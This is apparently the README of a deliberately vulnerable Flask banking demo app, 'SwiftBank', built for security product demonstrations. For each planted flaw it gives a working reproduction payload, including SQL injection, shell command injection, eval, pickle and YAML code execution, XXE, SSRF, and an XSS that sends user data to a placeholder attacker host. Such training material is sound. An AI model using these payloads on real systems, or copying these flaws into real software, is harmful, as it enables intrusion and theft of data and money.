# SwiftBank — Intentionally Vulnerable Demo (#2)

A personal banking dashboard built on **Flask + SQLite**, deliberately seeded with vulnerabilities for cybersecurity product demos.

> ⚠️ **DO NOT DEPLOY PUBLICLY.** Run only on `localhost` or an isolated lab. The app stores plaintext passwords, runs `eval()`, accepts pickle / YAML / XXE input, and ships with Flask debug mode on.

This is the **second** demo site in this folder (sibling of `../padelgol/`). It targets a different domain (money movement) and a different vulnerability surface (Python-specific sinks + banking business-logic flaws).

## Run

```bash
cd swiftbank
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python app.py
# → http://127.0.0.1:5001
```

The first run auto-seeds `swiftbank.db`.

## Demo accounts

| Username | Password   | Role     | Notes |
|----------|------------|----------|-------|
| admin    | admin2025  | admin    | Owns the €9.9M "House Account" |
| johndoe  | P@ssw0rd   | customer | Checking + Savings, ~€23k |
| janedoe  | spring2025 | customer | Checking + Vacation Fund |
| emma     | letmein    | customer | Low balance |
| mark     | hunter2    | customer | Mid balance |

> 2FA OTP is helpfully echoed on the OTP screen (vuln #14).

## Catalogue of planted vulnerabilities

Distinct from the PadelGol demo. Anchored to OWASP Top 10 (2021).

### A01 — Broken Access Control
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 6 | **Unsigned identity cookie** (`uid=N`) is honored | `current_user()` in `app.py` | `curl -b uid=1 http://localhost:5001/dashboard` → admin's house account |
| 21 | **IDOR — read any account** | `GET /account/<id>` | Login as `mark`, visit `/account/1` |
| 23 | **IDOR — transfer from any account** | `POST /transfer` `from_id=` | Submit a transfer with `from_id=1` (house account) |
| 37/38 | **Admin auth bypass** — `/admin` doesn't enforce role | `GET /admin` | Log in as `mark`, browse `/admin` directly |
| 34 | **Hardcoded admin backdoor header** | `X-Admin-Token: let-me-in-please` on `/api/balance` | `curl -H "X-Admin-Token: let-me-in-please" http://localhost:5001/api/balance` |
| 19 | **Mass assignment** — `role` / opening `balance` from registration | `POST /register` | Send `role=admin&balance=99999999` |
| 28 | **Mass assignment** — change `role` / `ssn` via profile | `POST /profile` | Send `role=admin` |

### A02 — Cryptographic Failures
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 1 | **Default Flask `secret_key='dev'`** → forgeable signed sessions | top of `app.py` | Use `flask-unsign` to forge a session cookie |
| 2 | **Hardcoded JWT key** in source | `JWT_KEY` constant | Mint your own tokens for `/api/balance` |
| 5 | **Cookie missing httpOnly/Secure/SameSite** | `app.config.update(...)` | DevTools → Application |

### A03 — Injection
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 11 | **SQLi — login bypass** | `POST /login` (string-concat SQL) | username `admin' --` password anything |
| 33 | **SQLi via JWT `kid` header** | `GET /api/balance` looks up signing key by kid in SQL | Forge a token with `kid: ' UNION SELECT 'attacker'--` and sign with `attacker` |
| 32 | **SQLi via cookie (`prefs.sort`)** | `GET /transactions` ORDER BY concat | Edit the `prefs` pickle to inject SQL into `sort` |
| 39 | **OS command injection** | `GET /admin/ping?host=` (shell=True) | `?host=127.0.0.1;id` |
| 41 | **`eval()` RCE** | `GET /admin/calc?expr=` | `?expr=__import__('os').popen('id').read()` |
| 46 | **SQLi via search `q`** | `GET /search?q=` | `?q=%' UNION SELECT 1,2,3,sql,5,6 FROM sqlite_master--` |

### A03 — XSS
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 46 | **Reflected XSS** | `GET /search?q=` rendered with `|safe` | `?q=<script>alert(1)</script>` |
| 28 | **Stored XSS — profile bio** | `POST /profile` bio rendered raw | Set bio `<img src=x onerror=fetch('/api/users').then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker',t))>` |
| — | **Stored XSS — transaction memo** | dashboard/account/transactions render memo raw | Transfer with memo `<script>alert(document.cookie)</script>` |

### A04 — Insecure Design
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 22 | **Negative-amount transfer** drains the recipient | `POST /transfer` | Transfer `amount=-500` to victim's IBAN → you gain €500, they lose €500 |
| 24 | **Race condition (TOCTOU) in transfer** | `POST /transfer` (read → sleep → write) | Two concurrent transfers of the full balance both succeed |
| 14 | **Predictable & echoed 2FA OTP** | `random.randint`, rendered in `otp.html` | Inspect login response, code is in the page |
| 15 | **No OTP lockout** | `/otp` | Brute-force 4 digits |
| 20 | **Predictable password reset token** (timestamp + username, base64) | `/forgot` | Compute token for any user, hit `/reset?token=...` |
| 22 / — | **No CSRF protection** | every mutating route | Cross-origin form post (CORS is also permissive) |

### A05 — Security Misconfiguration
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 4 / 44 | **Flask debug + Werkzeug debugger console** | `app.debug = True`, `/boom?x=0` | Trigger /boom, get interactive console at `/console` (PIN gate; #43 leaks its inputs) |
| 12/47 | **Verbose tracebacks** | login SQL error + 500 handler | Send malformed SQL via login |
| 43 | **`/debug` leaks** secret key, JWT key, backdoor, env, session | `GET /debug` | Browse `/debug` |
| 8 | **Permissive CORS w/ credentials** | `@app.after_request` | Any origin reads responses |
| 9 | **Missing security headers** | (absence) | No CSP/HSTS/X-Frame-Options/X-CTO |

### A06 — Vulnerable & Outdated Patterns
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 31 | **Pickle deserialization → RCE** | `pickle.loads` on the `prefs` cookie at `/transactions` | Build payload `pickle.dumps(Evil())` with `__reduce__ = (os.system, ("touch /tmp/pwn",))`, b64, set as `prefs` cookie, hit `/transactions` |
| 42 | **YAML deserialization → RCE** | `yaml.load(... Loader=FullLoader)` at `/admin/import-config` | Upload `!!python/object/apply:os.system ["id"]` |
| 27 | **XXE** in legacy XML statement import | `/statement/import` (`lxml.etree` `resolve_entities=True`, `no_network=False`) | POST `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` |

### A07 — Identification & Authentication Failures
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 13 | **Username enumeration** via distinct login errors | `POST /login` | "No such user" vs "Wrong password" |
| 10 | **Account-number enumeration** | `GET /api/account-lookup?number=` | 404 vs 200 reveals validity + holder name |
| 35 | **JWT `alg:none` accepted** | `/api/balance` | Sign a token with `{"alg":"none"}` |
| 33 | **JWT `kid` SQLi** (also injection class) | `/api/balance` | See A03 |

### A08 — Software & Data Integrity Failures
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 29 | **Unrestricted file upload** (avatar) | `POST /profile/avatar` | Upload `pwn.html` → visit `/uploads/pwn.html` (same origin) |
| 31/42 | (see pickle / YAML) | | |
| 26 | **CSV / formula injection** | `GET /statement/export` | Transfer with memo `=cmd|'/C calc'!A1`, export → opens in Excel |

### A09 — Security Logging & Monitoring Failures
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| — | **No audit log** of money movements | every mutating route | — |
| 12/47 | **Stack traces returned to client** | `/login` + 500 handler | — |

### A10 — Server-Side Request Forgery
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 40 | **SSRF** in "verify external bank" | `GET /admin/verify-bank?url=` | `?url=file:///etc/passwd` or `?url=http://169.254.169.254/latest/meta-data/` |
| 25 | **Path traversal** in statement download | `GET /statement/download?name=` | `?name=../app.py` or `?name=/etc/hosts` |
| 7/17/45 | **Open redirect** | `/login`'s `next=`, `/redirect?url=` | `/redirect?url=http://evil.example` |

### A06 / Data Exposure
| # | Vulnerability | Where | Reproduce |
|---|---|---|---|
| 36 | **Excessive data in `/api/users`** — returns password / SSN / OTP / reset token | `/api/users` | `curl -b uid=2 http://localhost:5001/api/users` |

## File map

```
swiftbank/
├── app.py                          # All routes; vulnerabilities tagged with `VULN #N` comments
├── requirements.txt
├── templates/                      # Jinja2 (memo, bio, q rendered with |safe → XSS)
├── static/                         # CSS + logo + default avatar
├── imports/march-2026.csv          # Sample target for /statement/download
├── uploads/                        # Avatar upload sink (served back)
├── swiftbank.db                    # Auto-seeded on first run
└── README.md                       # This catalogue
```

## How this differs from PadelGol (sibling demo)

| Surface                       | PadelGol (Node/Express) | SwiftBank (Python/Flask)             |
|-------------------------------|-------------------------|--------------------------------------|
| Domain                        | Court booking           | Personal banking                     |
| **SSTI**                      | —                       | **Jinja2 via `render_template_string`** (#30) |
| **Pickle RCE**                | —                       | **`pickle.loads` on cookie** (#31)    |
| **YAML RCE**                  | —                       | **`yaml.load` admin import** (#42)    |
| **XXE**                       | —                       | **`lxml` with entities on** (#27)    |
| **Flask debugger / `/console`** | —                     | **`app.debug=True`** (#4 / #44)      |
| **Race condition**            | —                       | **TOCTOU in transfer** (#24)         |
| **Business-logic flaw**       | —                       | **Negative-amount transfer** (#22)   |
| **JWT `kid` SQLi**            | —                       | **`/api/balance` kid lookup** (#33)  |
| **CSV formula injection**     | —                       | **`/statement/export`** (#26)        |
| **SSTI / pickle / YAML / XXE** | —                      | All four Python-specific RCE paths   |

Shared (similar idea, different surface): SQLi in login, reflected/stored XSS, IDOR, mass assignment, CORS misconfig, JWT `alg:none`, open redirect, command injection, SSRF, path traversal, file upload, `/debug` secret leak.
